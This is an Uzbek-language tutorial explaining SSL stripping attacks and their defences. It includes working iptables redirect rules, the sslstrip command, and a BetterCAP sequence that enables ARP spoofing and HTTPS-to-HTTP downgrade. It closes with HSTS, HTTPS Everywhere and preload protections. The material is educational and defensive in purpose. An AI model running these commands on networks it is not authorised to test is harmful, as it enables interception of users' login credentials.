# SSL Stripping

HTTPS ni HTTP ga tushirishga urinish hujumi.

---

## Tushuntirish

```text
Normal:
User → https://bank.com (HTTPS)

SSL Stripping:
User → http://bank.com (HTTP) ← Hujumchi
     ↓
Hujumchi → https://bank.com (HTTPS) ← Asl server
```

---

## Hujum qanday ishlaydi?

```text
1. Foydalanuvchi https://bank.com ga kiradi
2. Hujumchi MITM da turadi
3. Hujumchi HTTP ga redirect qiladi
4. Foydalanuvchi HTTP versiyasini ko'radi
5. Login ma'lumotlari ochiq ketadi
```

---

## ⚠️ Ogohlantirish

**Faqat o'z tarmog'ingizda sinang!**

---

## Amaliy hujum (o'rganish uchun)

###sslstrip (Python)

```python
# sslstrip - HTTPS ni HTTP ga tushirish
# Faqat o'rganish uchun!

# 1. ARP spoofing boshlang (MITM)
# 2. Iptables bilan trafikni yo'naltiring

# Iptables qoidalari:
# sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# 3. sslstrip ni ishga tushiring
# sslstrip -l 8080
```

### BetterCAP yordamida

```bash
# BetterCAP - zamonaviy MITM vositasi
sudo bettercap -iface eth0

# Modullarni yuklash
net.probe on
net.recon on
arp.spoof on

# HTTPS to HTTP
http.proxy on
http.proxy.sslstrip true
```

---

## Himoya

### 1. HSTS (HTTP Strict Transport Security)

```text
Server header:
Strict-Transport-Security: max-age=31536000; includeSubDomains

Browser: HTTPS ni faqat ishlatadi, HTTP ga qaytmaydi
```

### 2. HTTPS Everywhere

```text
Browser extension:
- Har doim HTTPS ni afzal ko'radi
- Ma'lum saytlarni HTTPS ga yo'naltiradi
```

### 3. Preload List

```text
HSTS Preload:
- Browser da qattiq kodlangan HTTPS saytlar
- Birinchi marta kirishda ham HTTPS ishlatiladi
```

---

## Xulosa

- SSL Stripping HTTPS ni HTTP ga tushirish hujumi
- HSTS, HTTPS Everywhere, Preload bilan himoya
- MITM hujumining bir turi
